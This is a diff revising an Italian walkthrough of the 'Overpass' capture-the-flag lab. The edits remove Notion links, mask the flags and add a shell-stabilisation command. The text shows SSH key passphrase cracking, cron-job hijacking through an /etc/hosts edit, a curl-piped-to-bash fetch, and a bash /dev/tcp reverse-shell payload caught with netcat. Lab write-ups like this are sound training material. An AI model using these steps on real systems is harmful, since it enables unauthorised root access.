@@ -107,7 +107,7 @@ kali@kali:~/Desktop/CTF/Overpass$ ssh -i key.rsa james@10.130.130.21
 Enter passphrase for key 'key.rsa': 
 ```
 
-Veniamo bloccati dalla richiesta di una password che non possediamo, ma possiamo provare a crackarla con [John The Ripper](https://app.notion.com/p/John-The-Ripper-3d0ee36546c28117b7e4e12b924107ea?pvs=21)
+Veniamo bloccati dalla richiesta di una password che non possediamo, ma possiamo provare a crackarla con **John The Ripper**
 
 ```bash
 kali@kali:~/Desktop/CTF/Overpass$ ssh2john key.rsa > hash.txt         
@@ -139,12 +139,12 @@ E siamo dentro! cerchiamo ora la prima flag
 james@ip-10-130-130-21:~$ ls
 todo.txt  user.txt
 james@ip-10-130-130-21:~$ cat user.txt 
-thm{65c1aaf000506e56996822c6281e6bf7}
+thm{********************************}
 james@ip-10-130-130-21:~$ 
 ```
 
 Ora dobbiamo procedere con l'elevazione dei permessi e riuscire a passare a root. Qui dobbiamo seguire una strada sensata..
-Procediamo con il cercare i file SUID ([Commands](https://app.notion.com/p/Commands-3d0ee36546c2814b91c9cd1b030791e1?pvs=21))
+Procediamo con il cercare i file SUID con comandi dedicati:
 
 ```text
  james@ip-10-130-130-21:~$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
@@ -166,7 +166,7 @@ Procediamo con il cercare i file SUID ([Commands](https://app.notion.com/p/Comma
 
 ```
 
- Niente di interessante, procediamo con la ricerca dei programmi eseguibili senza sudo ([Commands](https://app.notion.com/p/Commands-3d0ee36546c2814b91c9cd1b030791e1?pvs=21))
+ Niente di interessante, procediamo con la ricerca dei programmi eseguibili senza sudo:
 
 ```bash
 james@ip-10-130-130-21:~$ sudo -l
@@ -176,7 +176,7 @@ Sorry, try again.
 
 Non conosciamo la password!
 
-Procediamo allora con il controllare i processi ([Commands](https://app.notion.com/p/Commands-3d0ee36546c2814b91c9cd1b030791e1?pvs=21))
+Procediamo allora con il controllare i processi:
 
 ```text
 james@ip-10-130-130-21:~$ ps auxww
@@ -188,7 +188,7 @@ root         631  0.0  0.1   5800  3108 ?        Ss   10:11   0:00 /usr/sbin/cro
 
 C'è crontab eseguito come root!
 
-Listiamo i cronjob ([Commands](https://app.notion.com/p/Commands-3d0ee36546c2814b91c9cd1b030791e1?pvs=21))
+Listiamo i cronjob:
 
 ```bash
 james@ip-10-130-130-21:~$ cat /etc/crontab
@@ -216,21 +216,21 @@ Ogni minuto viene eseguito
 Possiamo modificare a cosa punta `overpass.thm`, se proviamo a fare
 `curl overpass.thm/downloads/src/buildscript.sh | bash`
 vediamo che `overpass.thm` punta a localhost (127.0.0.1)
-Possiamo aprire sulla macchina attaccante un webserver in python che ospita un file `buildscript.sh` malevolo che crea una reverse-shell ([Reverse-Shell e Bind Shell](https://app.notion.com/p/Reverse-Shell-e-Bind-Shell-3d0ee36546c281a9bd75cc9b7ecb91d4?pvs=21))!
-Dalla macchina attaccante avvio il webserver `python3 -m http.server 80` e dalla stessa cartella di dove ho avviato il webserver creo questa struttura di file e cartelle `downloads/src/buildscript.sh` e in `buildscript.sh` scrivo il payload ([Reverse-Shell e Bind Shell](https://app.notion.com/p/Reverse-Shell-e-Bind-Shell-3d0ee36546c281a9bd75cc9b7ecb91d4?pvs=21))
+Possiamo aprire sulla macchina attaccante un webserver in python che ospita un file `buildscript.sh` malevolo che crea una reverse shell!
+Dalla macchina attaccante avvio il webserver `python3 -m http.server 80` e dalla stessa cartella di dove ho avviato il webserver creo questa struttura di file e cartelle `downloads/src/buildscript.sh` e in `buildscript.sh` scrivo il payload di reverse shell:
 
 ```text
 bash -c 'exec bash -i &>/dev/tcp/192.168.163.29/4444 <&1'
 ```
 
 Dove `192.168.163.29` è la macchina dove verrà instaurato la reverse shell, IP ottenuto tramite `ip a show tun0` 
-Subito dopo apriamo subito la porta `4444` per ricevere la reverse shell usando [netcat](https://app.notion.com/p/netcat-3d0ee36546c281c1a236f3af1017b763?pvs=21)
+Subito dopo apriamo subito la porta `4444` per ricevere la reverse shell usando **netcat**:
 
 ```text
 nc -lvnp 4444
 ```
 
-A questo punto dobbiamo modificare i [DNS](https://app.notion.com/p/DNS-3d0ee36546c281389160df099d06af52?pvs=21) di overpass.thm nella macchina vittima, apriamo con `nano /etc/hosts` e commentiamo la riga `overpass.thm 127.0.0.1` e in fondo scriviamo `192.168.163.29 overpass.thm`
+A questo punto dobbiamo modificare la risoluzione di `overpass.thm` nella macchina vittima, apriamo con `nano /etc/hosts` e commentiamo la riga `overpass.thm 127.0.0.1` e in fondo scriviamo `192.168.163.29 overpass.thm`
 
 ```bash
 james@ip-10-130-130-21:~$ cat /etc/hosts
@@ -265,7 +265,7 @@ root.txt
 src
 root@ip-10-130-130-21:~# cat root.txt
 cat root.txt
-thm{7f336f8c359dbac18d54fdd64ea753bb}
+thm{********************************}
 ```
 
-Nota: solitamente si preferisce stabilizzare la reverse shell: [Reverse-Shell e Bind Shell](https://app.notion.com/p/Reverse-Shell-e-Bind-Shell-3d0ee36546c281a9bd75cc9b7ecb91d4?pvs=21)
+Nota: solitamente si preferisce stabilizzare la reverse shell (con `python3 -c 'import pty; pty.spawn("/bin/bash")'`).
